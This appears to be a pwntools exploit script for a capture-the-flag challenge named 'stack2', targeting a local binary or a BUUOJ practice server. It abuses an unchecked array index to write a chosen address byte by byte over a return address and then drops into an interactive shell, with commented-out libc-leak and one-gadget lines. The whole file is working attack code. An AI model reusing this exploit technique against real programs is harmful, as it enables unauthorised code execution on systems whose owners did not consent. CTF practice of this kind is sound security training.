import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./stack2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./stack2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',28029)
			elf=ELF('./stack2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		system=0x0804859b
		io.recv()
		io.sendline('99')
		io.recv()
		for i in range(99):
			io.sendline(str(0xff))
		io.recv()
		io.sendline('3')
		io.recv()
		io.sendline(str(0x84))
		io.recv()
		io.sendline(str(system))
		io.sendline('3')
		io.recv()
		io.sendline(str(0x85))
		io.recv()
		io.sendline(str(system>>8))
		io.sendline('3')
		io.recv()
		io.sendline(str(0x86))
		io.recv()
		io.sendline(str(system>>16))
		io.sendline('3')
		io.recv()
		io.sendline(str(0x87))
		io.recv()
		io.sendline(str(system>>24))
		io.sendline('5')

		


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue